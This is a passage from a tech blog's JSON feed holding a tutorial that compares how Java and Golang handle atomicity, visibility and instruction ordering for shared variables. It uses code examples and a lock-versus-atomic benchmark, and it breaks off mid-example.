      "date_published": "2021-05-03T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-en/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-en/",
      "title": "The Difference Between Java and Golang in  Writing Concurrent Code to Access Shared Variable",
      "content_html": "<!-- summary -->\n<p>When writing concurrency code, we often use mechanisms like Lock or Synchronized to protect share resources (sometimes it’s a piece of code). What if we merely want to protect one variable but not a whole code? It’s too expensive to use Lock or Synchronized to protect just one variable.</p>\n<!-- summary -->\n<p>Let’s see one simple Golang code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkLocke</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><br>\t\t<span class=\"token keyword\">var</span> l sync<span class=\"token punctuation\">.</span>Mutex<br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t\ta<span class=\"token operator\">++</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>And profiling of the code will tell you how expensive Lock cost, as shown below:</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/lock-profiling.png\" alt=\"\"></p>\n<p>You can see that lots of CPU time were wasted in Lock.</p>\n<p>To improve performance, often we would not use lock if we just want to protect one variable instead of the piece of code.</p>\n<p>In this article, I will introduce how to protect these share variables in Java and Golang.</p>\n<p>In the very beginning, three things need to care: <strong>atomicity</strong>, <strong>visibility</strong>, and <strong>ordering</strong>. It’s too hard to understand from words, so let’s see examples directly.</p>\n<h1 id=\"atomicity\"><a class=\"direct-link\" href=\"#atomicity\">#</a> Atomicity</h1>\n<p>The action to access shared variable must be executed all in once and indivisibly. A line of code may be composed of several cpu instructions, like the codei++ is composed of 3 cpu instructions: <code>read value</code>, <code>add 1 to value</code> and <code>save value</code>. If two threads run i++ simultaneously, all these cpu instructions may be executed interleaved:</p>\n<pre class=\"language-text\"><code class=\"language-text\">thread1 load value 100  <br>thread2 load value 100  <br>thread1 add 1 to value 101  <br>thread2 add 1 to value 101  <br>thread1 save value 101  <br>thread2 save value 101</code></pre>\n<p>Finally, we get a wrong answer: i = 101, which is not correct.<br>\nLet’s look at a simple Java example :</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Atomic</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                counter<span class=\"token punctuation\">.</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Line 16 should print 100000, but the value printed is always less than 100000. That’s why we must care about atomicity.</p>\n<h1 id=\"visibility\"><a class=\"direct-link\" href=\"#visibility\">#</a> Visibility</h1>\n<p>In Multicore architecture, every CPU has its cache. Thus CPU can load value from cache, which is faster than loading value from main memory. The architecture looks like below:</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/cpu-architecture.png\" alt=\"\"></p>\n<p>So it’s clear that the value of a variable may exist in multi CPU’s cache. If cpu1 changes the value of one variable but cpu2 did not aware of that, cpu2 may use the old value until cpu2 reload the value from main memory.</p>\n<p>Here is simple Java code to show the problem:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">boolean</span> bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Even thread t2 had changed the flag to true in line 12, thread t1 would still live in an infinite loop in line 4~6. That’s because t1 does not see a new value of the flag.</p>\n<h1 id=\"ordering\"><a class=\"direct-link\" href=\"#ordering\">#</a> Ordering</h1>\n<p>Sometimes the compile would reordering instructions due to the purpose of optimizations. As a result, the ordering of instructions running in your machine may not as your imagination. See these three codes:</p>\n<pre class=\"language-text\"><code class=\"language-text\">a = 1  <br>b = 2  <br>c = a + b</code></pre>\n<p>line 3 is a dependency on line1 &amp; line2, so the real ordering of instructions may like below:</p>\n<pre class=\"language-text\"><code class=\"language-text\">b = 2  <br>a = 1  <br>c = a + b</code></pre>\n<p>It’s ok when your code is running on a single thread. But when running on multi-thread, the reordering may cause some bug you can not understand. Take the code for example:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>In the writing order, we assign a=2 first and then b=1, so it should never happen that the code runs the block behind the if condition in line 12. But it’s possible. Although it’s very rare to happen, it DO happen.</p>\n<p>Note that visibility and ordering are often seen together as the problem of <a href=\"https://en.wikipedia.org/wiki/Happened-before\">happen-before</a>.</p>\n<p>It’s common that implementing singleton pattern with double-checked locking to improve performance. If you were not aware of happen-before, it may cause some issue: even if the singleton instance is not null, that does not mean that system had finished constructed the singleton instance. You can see more detail in this <a href=\"https://en.wikipedia.org/wiki/Double-checked_locking\">wiki</a>.</p>\n<p>So let’s see how Java and Golang solve these issues.</p>\n<h1 id=\"java\"><a class=\"direct-link\" href=\"#java\">#</a> Java</h1>\n<h2 id=\"how-java-solve-atomicity\"><a class=\"direct-link\" href=\"#how-java-solve-atomicity\">#</a> How Java solve Atomicity</h2>\n<p>Java provides <strong>package java.util.concurrent.atomic</strong> to guarantee the atomicity when accessing a shared variable. For example, we could use <strong>AtomicInteger</strong> to fix the first example in the beginning like below:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">incrementAndGet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">AtomicInteger</span> i <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AtomicInteger</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h2 id=\"how-java-solve-happen-before\"><a class=\"direct-link\" href=\"#how-java-solve-happen-before\">#</a> How Java solve happen-before</h2>\n<p>Java uses keyword <strong>volatile</strong> to ensure happen-before. Once you declare a variable with volatile, then happen-before is guaranteed in that variable.</p>\n<p>Let’s look at the secondary example in the beginning, I use volatile to declare the variable as below:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">boolean</span>  bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Now when thread t2 updates bool variable in Flag, thread t1 would be aware of that and escape from the for loop.</p>\n<p>Then the third example. After I declare variables a and b with volatile, Compiler would make sure that a=2 happen before b=1, so it would guarantee that the program never enters if statement.</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Nonthread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h1 id=\"golang\"><a class=\"direct-link\" href=\"#golang\">#</a> Golang</h1>\n<h2 id=\"how-golang-solve-atomicity\"><a class=\"direct-link\" href=\"#how-golang-solve-atomicity\">#</a> How Golang solve Atomicity</h2>\n<p>Golang provides its atomicity tool kit, too.</p>\n<p>Do you remember the Golang’s Lock example at the beginning of the article? We can use atomic instead of Lock:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkFib10</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token function\">int64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tatomic<span class=\"token punctuation\">.</span><span class=\"token function\">AddInt64</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>If you run benchmark, you would figure out the performance gap between Lock and atomicity:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">BenchmarkLock-8 <span class=\"token number\">9266</span> <span class=\"token number\">134075</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op  <br>BenchmarkAtomic-8 <span class=\"token number\">19225</span> <span class=\"token number\">62309</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op</code></pre>\n<p>And below is the profiling of atomicity:</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/atomic-profiling.png\" alt=\"\"></p>\n<h2 id=\"how-golang-solve-happen-before%3F\"><a class=\"direct-link\" href=\"#how-golang-solve-happen-before%3F\">#</a> How Golang solve happen-before?</h2>\n<p>According to Golang’s official blog, Golang would guarantee happen-before in these conditions:</p>\n<ul>\n<li>Initialization</li>\n<li>Goroutine creation</li>\n<li>Goroutine destruction</li>\n<li>Channel communication</li>\n<li>Locks</li>\n<li>Once</li>\n</ul>\n<p>But Golang does not provide something like volatile in Java to protect one variable share between goroutines. In terms of visibility, Such as below code may be incorrect synchronization:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">continue</span><br>\t\t<span 